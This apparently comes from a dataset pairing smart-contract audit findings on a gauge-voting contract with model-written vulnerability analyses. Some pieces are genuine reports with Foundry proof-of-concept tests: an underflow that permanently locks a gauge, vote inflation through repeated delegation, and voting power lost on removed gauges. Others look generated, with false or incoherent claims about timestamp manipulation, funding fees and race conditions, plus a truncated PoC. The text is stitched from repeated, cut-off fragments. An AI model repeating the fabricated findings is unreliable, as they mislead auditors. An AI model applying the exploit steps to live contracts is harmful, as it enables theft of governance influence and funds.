statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so.

        "gt": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below.

The type of vulnerability is \"Incorrect conditional checks and calculations.\"\n\nThe reason for this vulnerability is that the function `_change_gauge_weight` contains an incorrect conditional check that leads to the wrong execution logic when updating weights. Specifically, the function uses `block.timestamp + WEEK` to calculate the next time period, but it does not take into account whether the current block timestamp is already past the next week boundary. If the current block timestamp is past the next week boundary, then the `next_time` variable will be set to a value that is less than the current block timestamp, which can cause incorrect weight updates and erroneous results during the weight update process.\n\nFurthermore, the function also miscalculates certain values, leading to additional vulnerabilities. For example, the `old_sum` variable is calculated by subtracting `old_gauge_weight` from `_get_sum()`, but it does not take into account whether `old_gauge_weight` is greater than or equal to `old_sum`. This can cause incorrect weight updates and erroneous results during the weight update process.\n\nOverall, the given smart contract code is vulnerable to incorrect conditional checks and calculations in handling weight updates, which can lead to security issues and potential exploits.",

Specifically, the function uses the `block.timestamp` variable, which can be tampered with by malicious actors to manipulate the behavior of the contract. This allows for a potential attacker to front-run other users by manipulating the timestamp and changing the outcome of the weight update process.\n\nTo demonstrate this vulnerability, I have generated a potential Proof of Concept (PoC) that demonstrates how an attacker could exploit this flaw. The PoC consists of the following steps:\n\n1. The attacker first calculates the `next_time` variable by dividing the current `block.timestamp` value by `WEEK`, and then multiplying the result by `WEEK`. This ensures that the calculated time is aligned with the `WEEK` period.\n2. The attacker then generates a new timestamp by incrementing the calculated `next_time` variable by 1 second. This allows the attacker to manipulate the `block.timestamp` value and ensure that their manipulated timestamp is used in the weight update process.\n3. The attacker then uses the manipulated timestamp to call the `_change_gauge_weight()` function, passing in a new `_weight` value for the gauge being updated. This will result in the weight being changed according to the manipulated timestamp, allowing the attacker to front-run other users.\n4. To demonstrate the effectiveness of this exploit, I have included an additional line of code that prints the current `block.timestamp` and the `next_time` variable values before and after the weight update process. This shows how the manipulated timestamp can be used to successfully front-run other users.\n\nHere is the modified code with the PoC:\n```Solidity\npragma solidity ^0.8.0;\n\ncontract FrontRunning {\n    uint256 public time_weight = 0;\n    mapping(address => uint256) public points_weight;\n    uint256 public time_sum = 0;\n    mapping(uint",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

This type of attack occurs when an attacker sends multiple transactions in quick succession, exploiting the fact that the contract is not able to process all of them before the blockchain state changes.\n\nIn this case, the `_change_gauge_weight` function is vulnerable because it modifies the state of the contract by adding a new weight for a gauge, but it does not ensure that the rewards are queued for the current cycle before doing so. If an attacker sends multiple transactions to update the weights of different gauges in quick succession, the contract may end up with incorrect total weight calculations and potentially prevent some gauges from receiving rewards or allow a malicious actor to perform a Denial of Service (DOS) attack on selected gauges by preventing them from receiving rewards.\n\nThe reason for my answer is that the vulnerability occurs when a gauge with a non-zero weight is re-added to the system during a new cycle but before rewards are queued for that cycle, which is exactly what the `_change_gauge_weight` function does.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

The `getLastUserPoint` function takes in the sender's address and returns the last point for that user, which includes the slope and timestamp of their previous vote.

If the power used by a user exceeds this limit, it may cause an integer overflow, leading to incorrect calculations and potentially vulnerabilities.\n2. **Division by zero**: In some cases, the `old_slope` variable may be initialized with a slope of zero. This can cause issues when dividing by this value later in the code. To mitigate this issue, it would be best to check if the old slope is non-zero before performing any divisions.\n3. **Unnecessary calculations**: The code performs some unnecessary calculations that may not be necessary depending on the specific use case.

The `vote_for_gauge_weights` function calculates the new slope for a user using the following formula: `(slope * _user_weight) / 10_000`. This means that the weight (or influence) of each vote is calculated based on the user's weight in the gauge, which could be incorrect if the funding fees are not accounted for.\n2. The function also calculates the bias for a slope using the formula `bias = old_bias + new_bias - old_bias`. This means that the bias is calculated as the sum of the old bias and the new bias, which could lead to an inflated total voting power if the funding fees are not accounted for.\n3. Finally, the function updates the total weight used by a user using the formula `power_used = power_used + new_slope.power - old_slope.power`. This means that the function is relying on the correct calculation of the total voting power to ensure that users can't use too much power, which could be incorrect if the funding fees are not accounted for.\n\nOverall, the code is vulnerable to this type of attack because it does not take into account the impact of funding fees on a user's weight in the gauge when calculating the new slope or bias.

This discrepancy makes it impossible for users to reach unanimous decisions, as their individual votes hold less weight than they should in relation to the incorrect total voting power.\n\nTo exploit this vulnerability, an attacker could create a large number of users, each with low voting power, and then contribute a small amount of Ether to the system while using a specific gauge address. The code would then calculate the user's weight based on their contribution and the total contributions, leading to an inflated total voting power for that gauge address.

The reason for this is that the contract's internal state is not properly protected against race conditions. In particular, the `vote_user_power` mapping is not updated atomically with other changes to the contract's state, which allows an attacker to exploit the vulnerability.\n\nThe vulnerability lies in the fact that the `VotedSlope` struct contains a `power` field, which represents the power (weight) used by a user for voting. However, this field is not updated atomically with other changes to the contract's state, which allows an attacker to manipulate it to create false impressions of power usage.\n\nFor example, consider the following scenario:\n\n1. User A votes on gauge weight using `vote_for_gauge_weights`. The function checks whether the vote is valid and updates the internal state accordingly.\n2. In the meantime, an attacker submits another transaction that updates the same user's `VotedSlope` struct with a larger value for the `power` field. This update is not properly protected against race conditions.\n3. User A's vote is processed, and the contract checks whether they have used enough power (weight) to make their vote valid. Since the attacker updated the user's `VotedSlope` struct with a larger value for the `power` field, the contract may incorrectly assume that the user has not used enough power, even though it is actually false.\n4. The contract then allows the vote to be processed, allowing the attacker to manipulate the gauge weights in favor of their own interests.\n\nTo mitigate this vulnerability, several steps can be taken:\n\n1. Use atomic updates for all state changes, such as the `vote_user_power` mapping and the `VotedSlope` struct. This ensures that all state changes are properly protected against race conditions.\n2. Implement rate limiting to prevent users from submitting too many votes within a short period of time.\n3.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",

Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).\n\nOne modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.\n\nConsider the following scenario:\n- Alice has some veRWA, and is now able to vote. \n- She votes on some pool, say, G1, using 100% of her voting power.\n- Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.\n- Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.\n\nIt is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.\n\n## Impact\n\nUsers can lose their voting power.\n\n## 